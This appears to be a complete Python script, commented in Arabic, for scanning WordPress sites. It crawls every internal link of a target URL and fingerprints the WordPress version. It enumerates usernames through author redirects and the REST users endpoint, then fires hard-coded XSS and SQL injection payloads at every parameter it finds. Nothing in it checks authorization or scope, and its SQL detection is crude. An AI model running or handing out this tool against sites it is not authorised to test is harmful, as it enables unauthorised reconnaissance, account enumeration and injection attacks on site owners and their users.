import requests
import re
import argparse
import os
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def detect_wp_version(url):
    """يحاول اكتشاف إصدار ووردبريس بعدة طرق"""
    version_sources = [
        (url, 'الرئيسية'),
        (f"{url}/readme.html", 'readme.html'),
        (f"{url}/wp-includes/version.php", 'version.php')
    ]
    
    for link, source in version_sources:
        response = requests.get(link, headers={'User-Agent': 'Mozilla/5.0'})
        version = re.search(r'WordPress (\d+\.\d+\.\d+)', response.text)
        if version:
            return f"[INFO] إصدار ووردبريس ({source}): {version.group(1)}"
    return "[WARNING] تعذر اكتشاف إصدار ووردبريس."

def extract_parameters(url):
    """يستخرج جميع البرامترات الممكنة من صفحات الموقع"""
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    params = re.findall(r'[?&]([a-zA-Z0-9_-]+)=', response.text)
    return list(set(params))

def check_xss(url, params):
    """يختبر XSS عبر جميع البرامترات الممكنة"""
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "\"><svg/onload=alert(1)>"]
    
    for param in params:
        for payload in xss_payloads:
            test_url = f"{url}/?{param}={payload}"
            response = requests.get(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            if payload in response.text:
                return f"[XSS] محتمل في {test_url}"
    return "[INFO] لم يتم العثور على XSS مباشر."

def check_sqli(url, params):
    """يختبر SQL Injection عبر البرامترات الممكنة"""
    sqli_payloads = ["' OR '1'='1", "' UNION SELECT null,null--", "' AND 1=1 --", "1' OR '1'='1"]
    
    for param in params:
        for payload in sqli_payloads:
            test_url = f"{url}/?{param}={payload}"
            response = requests.get(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            if "mysql" in response.text.lower() or "sql" in response.text.lower():
                return f"[SQLi] محتمل في {test_url}"
    return "[INFO] لم يتم العثور على SQL Injection مباشر."

def check_users_enum(url):
    """يحاول استخراج أسماء المستخدمين عبر جميع الطرق الممكنة"""
    users = []
    for i in range(1, 20):
        test_url = f"{url}/?author={i}"
        response = requests.get(test_url, allow_redirects=False, headers={'User-Agent': 'Mozilla/5.0'})
        if response.status_code in [301, 302]:
            user = re.search(r'/author/(.*)/', response.headers.get('Location', ''))
            if user and user.group(1) not in users:
                users.append(user.group(1))
    
    wp_json_url = f"{url}/wp-json/wp/v2/users"
    response = requests.get(wp_json_url, headers={'User-Agent': 'Mozilla/5.0'})
    if response.status_code == 200:
        json_users = re.findall(r'"name":"(.*?)"', response.text)
        users.extend(json_users)
    
    return "[INFO] أسماء المستخدمين: " + ", ".join(set(users)) if users else "[INFO] لم يتم العثور على أسماء مستخدمين."

def get_links(url, start_url):
    """يجلب جميع الروابط الداخلية للموقع"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            return []
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()
        for a_tag in soup.find_all("a", href=True):
            full_url = urljoin(url, a_tag["href"])
            if urlparse(full_url).netloc == urlparse(start_url).netloc:
                links.add(full_url)
        return links
    except Exception as e:
        print(f"[خطأ] لم يتمكن من جلب {url}: {e}")
        return []

def crawl(url, start_url, visited_urls, results_file):
    """يقوم بالزحف على الموقع واختبار الثغرات"""
    if url in visited_urls:
        return
    print(f"[زيارة] {url}")
    visited_urls.add(url)
    links = get_links(url, start_url)
    
    with open(results_file, "a", encoding="utf-8") as file:
        results = []
        results.append(detect_wp_version(url))
        all_params = extract_parameters(url)
        results.append(check_xss(url, all_params))
        results.append(check_sqli(url, all_params))
        results.append(check_users_enum(url))
        
        for result in results:
            if result:
                file.write(result + "\n")
        
    for link in links:
        time.sleep(1)  # تأخير بسيط لتجنب الحظر
        crawl(link, start_url, visited_urls, results_file)

def main():
    parser = argparse.ArgumentParser(description="أداة متقدمة لفحص ثغرات ووردبريس والزحف عبر الروابط")
    parser.add_argument("url", help="رابط الموقع لبدء الزحف والفحص")
    parser.add_argument("-o", "--output", default="results.txt", help="ملف الإخراج لحفظ النتائج")
    args = parser.parse_args()
    
    visited_urls = set()
    crawl(args.url, args.url, visited_urls, args.output)
    print(f"[انتهاء] تم حفظ النتائج في {args.output}")

if __name__ == "__main__":
    main()
